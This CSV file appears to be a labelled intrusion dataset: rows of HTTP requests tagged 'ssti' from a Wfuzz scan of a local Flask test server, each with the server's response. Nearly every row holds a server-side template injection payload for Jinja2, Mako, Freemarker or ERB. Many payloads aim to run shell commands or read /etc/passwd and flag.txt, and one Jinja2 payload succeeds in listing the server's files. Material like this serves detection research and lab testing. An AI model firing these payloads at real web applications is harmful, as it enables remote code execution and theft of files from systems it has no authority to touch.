attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34066
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{['cat$IFS/etc/passwd']|filter('system')}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34080
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{['cat\x20/etc/passwd']|filter('system')}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34092
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={$smarty.version},"<h2>Hey, {smarty.version}</h2> ",close,31,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34106
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{['id']|filter('system')}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34118
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20""warning""%20in%20x.__name__%20%}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34134
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{config.__class__.__init__.__globals__['os'].popen('ls').read()}},"<h2>Hey, DVWA-master.zip lfi log.txt wfuzz_all_attack wfuzz_bad_chars wfuzz_sql wfuzz_ssti.pcap wfuzz_xml wfuzz_xss </h2> ",close,122,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34136
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{''.__class__.mro()[1].__subclasses__()[396]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34142
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{%20config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read()%20}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34150
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{%20''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()%20}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34164
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{app.request.query.filter(0,0,1024,{'options':'system'})}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34166
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${""freemarker.template.utility.Execute""?new()(""id"")}","<h2>Hey, {freemarker.template.utility.xecutenewid}</h2> ",close,56,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34178
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=[,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34180
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=<,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34188
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=<%=%20File.open('/etc/passwd').read%20%>,"<h2>Hey,  ile.openetcpasswd.read </h2> ",close,39,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34192
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{self}},"<h2>Hey, &lt;TemplateReference None&gt;</h2> ",close,45,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34202
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{%20request%20}},"<h2>Hey, &lt;Request &#39;http://192.168.1.40:5000/users?username=%7B%7B%20request%20%7D%7D&#39; [GET]&gt;</h2> ",close,112,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34208
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{'a'.toUpperCase()}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34214
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{''.class.mro()[1].subclasses()}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34222
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={%%20for%20key,%20value%20in%20config.iteritems()%20%}<dt>{{%20key|e%20}}</dt><dd>{{%20value|e%20}}</dd>{%%20endfor%20%}","<h2>Hey, { for key value in config.iteritems }dtdtdddd{ endfor }</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34224
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{%20[].class.base.subclasses()%20}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34232
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{config.items()}},"<h2>Hey, &lt;built-in method items of Config object at 0x7f55446d9f80&gt;</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34238
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{app.request.server.all|join(',')}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34252
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{dump(app)}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34262
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34270
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${{7*7}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34276
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${3*3},"<h2>Hey, {}</h2> ",close,17,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34290
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{7*7}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34304
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=<%=%207%20*%207%20%>,"<h2>Hey,     </h2> ",close,19,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34312
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.cache.compat.inspect.os.systemid}</h2> ",close,61,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34314
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${self.__init__.__globals__['util'].os.system('id')},"<h2>Hey, {self.init.globalsutil.os.systemid}</h2> ",close,50,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34326
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.util.os.systemid}</h2> ",close,62,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34328
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.filters.compat.inspect.os.systemid}</h2> ",close,63,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34334
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.util.os.systemid}</h2> ",close,64,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34336
